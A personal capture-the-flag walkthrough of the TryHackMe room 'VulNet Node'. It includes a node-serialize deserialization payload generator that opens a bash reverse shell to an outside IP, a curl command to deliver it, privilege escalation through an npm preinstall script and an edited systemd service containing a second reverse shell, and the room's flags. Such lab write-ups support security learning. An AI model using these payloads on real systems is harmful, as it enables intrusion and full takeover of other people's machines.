# Tryhackme.com Room : VulNet Node

`https://tryhackme.com/room/vulnnetnode`

## Instance

```bash
export IP="10.10.207.221"
```

## Nmap

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
```

## Initial Foothold

Static blog on port `8080` 

We see the potential users

```
Tilo Mitra
Eric Ferraiuolo
Reid Burke
Andrew Woolbridge
```

There is a `/login` page asking for an email.

We can probably assume that the domain is `vulnnet.thm` 



Seems like the endpoint is case insensitive.

The login page doesn't seem to do much.

Looking at the cookies, we find `session`

```
eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==
```

which translate to 

```
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

Let's try to change `isGuest`

Doesn't do anything.

We probably need to trigger some RCE with regards to the unserialization process

Potential solution : https://www.yeahhub.com/nodejs-deserialization-attack-detailed-tutorial-2018/



Actually, when we change the `username` in the cookie, we change the the `Welcome XXX` message

Maybe this is a template injection vuln ?



Managed to get a stacktrace by feeding crap JSON :

```
SyntaxError: Unexpected token % in JSON at position 0
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/www/VulnNet-Node/server.js:16:24
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
```

Which show that the server is in fact using `node-serialize` which bring us back to the unserialization RCE.



Soooo, in the end, it was really easy.. I was just stupid for 2 reasons

1. I was sending the payload in the `token` cookie... not `session` ...
2. I was using the wrong curl command to send the cookie (`-c` instead of `--cookie`). 
   I realized it when I manually entered the cookie in the browser and it worked...

I generated the cookie with this js code

```javascript
var serialize = require('node-serialize');

var payload = {
    pwn: function(){
        require("child_process").exec("bash -c 'bash -i >& /dev/tcp/10.2.13.34/7777 0>&1'")
    }
};

var vuln_payload = serialize.serialize(payload).replace('}"','}()"');
var encoded = Buffer.from(vuln_payload).toString('base64')

console.log(encodeURIComponent(encoded))
```

I created this simple code to test my payload before sending it on the server

```javascript
var serialize = require('node-serialize');
var input = process.argv[2]
var decoded = Buffer.from(input, 'base64').toString('ascii')

var unserialized = serialize.unserialize(decoded)

console.log(unserialized)
```



Once I had a working payload, I sent the request using 

```bash
curl --cookie "session=$(node create_payload.js)" $IP:8080
```



And now we have a shell. That was actually pretty easy... 

Lesson learned, always double check parameters and cookie value...

## Priv esc

We are now logged in as `www` user (full user).

There is no `user.txt` here, probably in another user



List of all users with shell:

```
root:x:0:0:root:/root:/bin/bash
serv-manage:x:1000:1000:serv-manage,,,:/home/serv-manage:/bin/bash
www:x:1001:1001:,,,:/home/www:/bin/bash
```

Running `sudo -l` we get

```
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

We can run `npm` as `serv-manage` 

From gtfobin we see that we can define a `preinstall` script in `package.json` and get a shell.

```bash
mkdir pwn && echo '{"scripts": {"preinstall": "/bin/sh"}}' > pwn/package.json
```

Then we run

```bash
sudo -u serv-manage /usr/bin/npm -C pwn --unsage-perm i
```

And we get a shell as 

```
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```

We upgrade our shell again via `python -c 'import pty; pty.spawn("/bin/bash")'` and we are good to go

We find `/home/serv-manage/user.txt`

```
THM{064640a2f880ce9ed7a54886f1bde821}
```



Running `sudo -l` we get

```
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

We find the config file using `find / -name "vulnnet-auto*" 2>/dev/null`

```
cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

I guess there is multiple way to make this work, my solution was to create another revshell from `vulnnet-job.service`



I modified the `ExecStart` in `/etc/systemd/system/vulnnet-job.service` to

```
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.13.34/6666 0>&1'
```

Then we need to 

```
/bin/systemctl daemon-reload
/bin/systemctl stop vulnnet-auto.timer
/bin/systemctl start vulnnet-auto.timer
```

And we get a shell ! (Because of the `OnBootSec=0min` config). We also could have modified `OnCalendar` so that the job is triggered every X seconds.



We now have a root shell and here we find `/root/root.txt`

```
THM{abea728f211b105a608a720a37adabf9}
```



## End

